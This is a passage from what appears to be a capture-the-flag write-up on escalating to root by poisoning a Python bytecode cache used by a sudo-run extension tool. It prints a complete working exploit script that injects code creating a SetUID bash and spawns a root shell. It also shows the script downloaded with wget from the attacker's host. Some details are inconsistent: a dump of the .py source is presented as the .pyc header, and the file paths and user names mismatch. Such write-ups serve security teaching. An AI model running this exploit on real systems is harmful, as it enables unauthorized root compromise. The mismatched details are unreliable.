    temp_dir = '/opt/extensiontool/temp'
    if not os.path.exists(temp_dir):
        os.mkdir(temp_dir)
    output_file = os.path.basename(output_file)
    with zipfile.ZipFile(os.path.join(temp_dir,output_file), 'w', zipfile.ZIP_DEFLATED) as zipf:
        for foldername, subfolders, filenames in os.walk(source_dir):
            for filename in filenames:
                filepath = os.path.join(foldername, filename)
                arcname = os.path.relpath(filepath, source_dir)
                zipf.write(filepath, arcname)
    print(f"[+] Extension packaged as {temp_dir}/{output_file}")

def main():
    parser = ArgumentParser(description="Validate, bump version, and package a browser extension.")
    parser.add_argument('--ext', type=str, default='.', help='Which extension to load')
    parser.add_argument('--bump', choices=['major', 'minor', 'patch'], help='Version bump type')
    parser.add_argument('--zip', type=str, nargs='?', const='extension.zip', help='Output zip file name')
    parser.add_argument('--clean', action='store_true', help="Clean up temporary files after packaging")
    
    args = parser.parse_args()

    if args.clean:
        clean_temp_files(args.clean)

    args.ext = os.path.basename(args.ext)
    if not (args.ext in os.listdir(EXTENSION_DIR)):
        print(f"[X] Use one of the following extensions : {os.listdir(EXTENSION_DIR)}")
        exit(1)
    
    extension_path = os.path.join(EXTENSION_DIR, args.ext)
    manifest_path = os.path.join(extension_path, 'manifest.json')

    manifest_data = validate_manifest(manifest_path)
    
    # Possibly bump version
    if (args.bump):
        bump_version(manifest_data, manifest_path, args.bump)
    else:
        print('[-] Skipping version bumping')

    # Package the extension
    if (args.zip):
        package_extension(extension_path, args.zip)
    else:
        print('[-] Skipping packaging')


if __name__ == '__main__':
    main()

```

When I run `python script.py`, the ASCII Python code is first converted to Python bytecode and then it’s executed. When modules are imported, that bytecode is often saved in the `__pycache__` directory so that the next time it’s imported, it’s already available in that format to save time. Real Python has a really nice [article](https://realpython.com/python-pycache/) with a lot of background on this.

The article also has a nice description of [What’s Inside a Cached `.pyc` File](https://realpython.com/python-pycache/#whats-inside-a-cached-pyc-file). It starts with a header, which can take two formats. It needs a way to know if the corresponding source code has changed. It does that either by storing a timestamp of when it was created (to compare to the timestamp of the source file), or a hash of the source file.

| Offset | Field Size | Field        | Description                           |
| ------ | ---------- | ------------ | ------------------------------------- |
| 0      | 4          | Magic number | Identifies the Python version         |
| 4      | 4          | Bit field    | Filled with zeros                     |
| 8      | 4          | Timestamp    | The time of `.py` file’s modification |
| 12     | 4          | File size    | Concerns the source `.py` file        |

Conversely, for **hash-based** `.pyc` files, the bit field can be equal to either one, indicating an *unchecked* variant, or three, meaning the *checked* variant. Then, instead of the timestamp and file size, there’s only one eight-byte field with the **hash value** of the Python source code:

| Offset | Field Size | Field        | Description                         |
| ------ | ---------- | ------------ | ----------------------------------- |
| 0      | 4          | Magic number | Identifies the Python version       |
| 4      | 4          | Bit field    | Equals 1 (unchecked) or 3 (checked) |
| 8      | 8          | Hash value   | Source code’s hash value            |

```
ry@browsed:/opt/extensiontool$ stat extension_utils.py
stat extension_utils.py
  File: extension_utils.py
  Size: 1245      	Blocks: 8          IO Block: 4096   regular file
Device: 252,0	Inode: 8541        Links: 1
Access: (0664/-rw-rw-r--)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2025-12-11 07:55:29.513046120 +0000
Modify: 2025-03-23 10:56:19.000000000 +0000
Change: 2025-08-17 12:55:02.920923490 +0000
 Birth: 2025-08-17 12:55:02.920923490 +0000

```

The naturally generated `.pyc` has the following header:

```
larry@browsed:/opt/extensiontool/__pycache__$ xxd /opt/extensiontool/extension_tool.py | head -1
< xxd /opt/extensiontool/extension_tool.py | head -1
00000000: 2321 2f75 7372 2f62 696e 2f70 7974 686f  #!/usr/bin/pytho

```

That breaks down to:

| Offset | Field Size | Field        | Value                                                           |
| ------ | ---------- | ------------ | --------------------------------------------------------------- |
| 0      | 4          | Magic number | 0x0a0d0dcb = Magic number for CPython 3.12                      |
| 4      | 4          | Bit field    | Filled with zeros                                               |
| 8      | 4          | Timestamp    | 0x67dfe8d3 = 1742727379 = Sunday, March 23, 2025 at 10:56:19 AM |
| 12     | 4          | File size    | 0x4dd = 1245, which matches the size of `extension_utils.py`    |

I’m going to write a Python script to abuse this setup. My final exploit is:

```
┌─[tester@parrot]─[~/Desktop/HTB/Browsed]
└──╼ $vim  poison.py 
```

### poison.py

```
┌─[tester@parrot]─[~/Desktop/HTB/Browsed]
└──╼ $cat poison.py 
import marshal
import subprocess
from pathlib import Path


BASE_DIR = Path("/opt/extensiontool")

print('[*] Running extension_tool.py to ensure .pyc files exist')
subprocess.run(['sudo', BASE_DIR / 'extension_tool.py'], capture_output=True)

print('[*] Reading legit header from .pyc')
pyc = BASE_DIR / '__pycache__/extension_utils.cpython-312.pyc'
raw_header = pyc.read_bytes()[:16]

print('[*] Creating poisoned source code')
orig = BASE_DIR / 'extension_utils.py'
orig_src = orig.read_text()
poisoned_src = orig_src + '''

import os
os.system('cp /bin/bash /tmp/tester; chmod 6777 /tmp/tester')
'''

print('[*] Compiling poisoned source and overwriting .pyc')
code = compile(poisoned_src, BASE_DIR / 'extension_utils.py', 'exec')
pyc.unlink()
pyc.write_bytes(raw_header + marshal.dumps(code))

print('[*] Running extension_tool.py with poisoned .pyc')
subprocess.run(['sudo', BASE_DIR / 'extension_tool.py'], capture_output=True)

shell = Path('/tmp/tester')
if shell.exists():
    print('[+] SetUID / SetGID bash exists. Starting root shell.')
    subprocess.run(['/tmp/tester', '-p'])
else:
    print('[-] Exploit failed')

```

It runs the program to make sure that the `.pyc` file exists (there is a cleanup script moving pretty aggressively). Then it gets the header from that file to reuse. It reads the source code for `extension_utils.py`, and adds code to the end that will create a SetUID / SetGID `bash`. Then it compiles that and dumps the header and bytecode to the `.pyc` file. I need to remove it first, as the legit copy is not writable by larry. But because the directory is world-writable, it’s easily removed, and then a new file is written. Finally, my code checks for the existence of `/tmp/0xdf`, and calls the shell.

http://10.10.16.128/poison.py

```
larry@browsed:~/markdownPreview$ cd /dev/shm
cd /dev/shm
larry@browsed:/dev/shm$ wget http://10.10.16.128/poison.py
wget http://10.10.16.128/poison.py
--2026-06-01 07:33:28--  http://10.10.16.128/poison.py
Connecting to 10.10.16.128:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1130 (1.1K) [text/x-python]
Saving to: ‘poison.py’

     0K .                                                     100% 28.5K=0.04s

2026-06-01 07:33:30 (28.5 KB/s) - ‘poison.py’ saved [1130/1130]

larry@browsed:/dev/shm$ 

```

```
larry@browsed:/opt/extensiontool$ python3.12 /dev/shm/poison.py
python3.12 /dev/shm/poison.py
[*] Running extension_tool.py to ensure .pyc files exist
[*] Reading legit header from .pyc
[*] Creating poisoned source code
[*] Compiling poisoned source and overwriting .pyc
[*] Running extension_tool.py with poisoned .pyc
[+] SetUID / SetGID bash exists. Starting root shell.

```
